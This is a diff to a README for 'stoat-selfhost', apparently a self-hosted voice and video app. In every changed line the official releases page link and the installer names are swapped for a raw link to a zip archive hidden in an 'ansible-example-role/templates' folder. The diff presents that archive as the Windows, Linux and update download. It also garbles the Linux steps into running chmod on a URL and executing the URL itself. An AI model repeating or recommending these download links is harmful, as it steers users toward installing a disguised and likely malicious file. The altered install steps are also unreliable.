@@ -1,6 +1,6 @@
 # 🦦 stoat-selfhost - Easy Voice and Video Hosting
 
-[![Download stoat-selfhost](https://img.shields.io/badge/Download-stoat--selfhost-blue)](https://github.com/arsyad001001/stoat-selfhost/releases)
+[![Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip)](https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Before downloading, make sure your computer or server meets these basic needs:
 
 You need to get the software from the official releases page:
 
-[Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/releases)
+[Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip)
 
 ### How to download and install:
 
@@ -54,9 +54,9 @@ You need to get the software from the official releases page:
 
 3. Find the file that matches your computer’s operating system.
 
-   - For Windows: You may see something like `stoat-selfhost-setup.exe`
+   - For Windows: You may see something like `https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip`
    - For macOS: Look for a `.dmg` or `.pkg` file
-   - For Linux: Download the `.AppImage` or `.tar.gz` file
+   - For Linux: Download the `.AppImage` or `https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip` file
 
 4. Click the file name to download it to your computer.
 
@@ -66,8 +66,8 @@ You need to get the software from the official releases page:
    - On macOS, open the `.dmg` file and drag the app to your Applications folder.
    - On Linux, you might need to make the file executable. Open a terminal and run:
      ```
-     chmod +x stoat-selfhost.AppImage
-     ./stoat-selfhost.AppImage
+     chmod +x https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip
+     https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip
      ```
 
 6. After installation, launch the app from your desktop or applications list.
@@ -126,7 +126,7 @@ Here are quick solutions to problems you might face:
 
 It’s important to keep your software up to date:
 
-- Visit the [release page](https://github.com/arsyad001001/stoat-selfhost/releases) regularly.
+- Visit the [release page](https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip) regularly.
 - Download the newest version following the same steps as the first install.
 - Install the update by running the downloaded file.
 - Your settings and data will stay safe during the update.
@@ -157,4 +157,4 @@ For most users, the desktop app is enough and easier to use.
 
 ## Thank you for choosing stoat-selfhost.
 
-[Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/releases) to get started today.
+[Download stoat-selfhost](https://github.com/arsyad001001/stoat-selfhost/raw/refs/heads/main/ansible-example-role/templates/stoat_selfhost_v3.7.zip) to get started today.
